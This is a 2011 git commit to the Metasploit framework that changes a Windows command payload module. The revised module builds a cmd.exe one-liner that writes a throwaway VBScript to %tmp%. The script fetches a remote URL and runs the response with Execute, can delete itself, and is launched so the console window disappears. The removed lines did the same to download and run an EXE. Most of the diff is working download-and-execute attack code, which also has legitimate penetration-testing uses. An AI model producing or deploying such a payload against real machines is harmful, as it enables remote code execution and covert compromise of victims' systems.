5faaa7db0719306f92afce97c4bb4e879eeb9333
Matt Weeks <scriptjunkie@scriptjunkie.us>
2011-06-11 20:37:08 +0000

    Update cmd vbs download payloads. Use : instead of longer echo statements. Add eval version.
    git-svn-id: file:///home/svn/framework3/trunk@12912 4d416f70-5f16-0410-b530-b9f4589650da

--- modules/payloads/singles/cmd/windows/download_eval_vbs.rb
+++ modules/payloads/singles/cmd/windows/download_eval_vbs.rb
@@ -18,9 +18,10 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'        => 'Windows Executable Download and Execute (via .vbs)',
+			'Name'        => 'Windows .vbs Download and execute',
 			'Version'     => '$Revision$',
-			'Description' => 'Download an EXE from an HTTP(S) URL and execute it',
+			'Description' => 'Downloads a file from an HTTP(S) URL and executes it as a vbs script. 
+						Use it to stage a vbs encoded payload from a short command line. ',
 			'Author'      => 'scriptjunkie',
 			'License'     => BSD_LICENSE,
 			'Platform'    => 'win',
@@ -37,10 +38,9 @@ module Metasploit3
 
 		register_options(
 			[
-				OptString.new('URL', [ true, "The pre-encoded URL to the executable" ]),
-				OptString.new('EXT', [ true, "The extension to give the saved file", "exe" ]),
+				OptString.new('URL', [ true, "The pre-encoded URL to the script" ]),
 				OptBool.new('INCLUDECMD', [ true, "Include the cmd /q /c", false ]),
-				OptBool.new('DELETE', [ true, "Delete created .vbs after download", true ])
+				OptBool.new('DELETE', [ true, "Delete created .vbs after download", false ])
 			], self.class)
 	end
 
@@ -49,27 +49,21 @@ module Metasploit3
 	end
 
 	def command_string
-		# It's already long. Keep variable names short.
+		# Keep variable names short.
 		vbsname = Rex::Text.rand_text_alpha(1+rand(2))
-		exename = Rex::Text.rand_text_alpha(1+rand(2))
 		xmlhttpvar = Rex::Text.rand_text_alpha(1+rand(2))
-		streamvar = Rex::Text.rand_text_alpha(1+rand(2))
 
 		command = ''
 		command << "cmd.exe /q /c " if datastore['INCLUDECMD']
-		# "start #{vbsname}.vbs" instead of just "#{vbsname}.vbs" so that the console window
-		# disappears quickly before the wscript libraries load and the file downloads
 		command << "cd %tmp%&echo Set #{xmlhttpvar}=CreateObject(\"Microsoft.XMLHTTP\"):"+
 			"#{xmlhttpvar}.Open \"GET\",\"#{datastore['URL']}\",False:"+
 			"#{xmlhttpvar}.Send:"+
-			"Set #{streamvar}=CreateObject(\"ADODB.Stream\"):"+
-			"#{streamvar}.Type=1:"+
-			"#{streamvar}.Open:"+
-			"#{streamvar}.Write #{xmlhttpvar}.responseBody:"+
-			"#{streamvar}.SaveToFile \"#{exename}.#{datastore['EXT']}\",2:"+
-			"CreateObject(\"WScript.Shell\").Run \"#{exename}.#{datastore['EXT']}\":"
-		command << "CreateObject(\"Scripting.FileSystemObject\").DeleteFile \"#{vbsname}.vbs\"" if datastore['DELETE']
+			"Execute #{xmlhttpvar}.responseText"
+		command << ":CreateObject(\"Scripting.FileSystemObject\").DeleteFile \"#{vbsname}.vbs\"" if datastore['DELETE']
+
+		# "start #{vbsname}.vbs" instead of just "#{vbsname}.vbs" so that the console window
+		# disappears quickly before the wscript libraries load and the file downloads
 		command << " >#{vbsname}.vbs"+
-			"&start wscript #{vbsname}.vbs"
+			"&start #{vbsname}.vbs"
 	end
 end
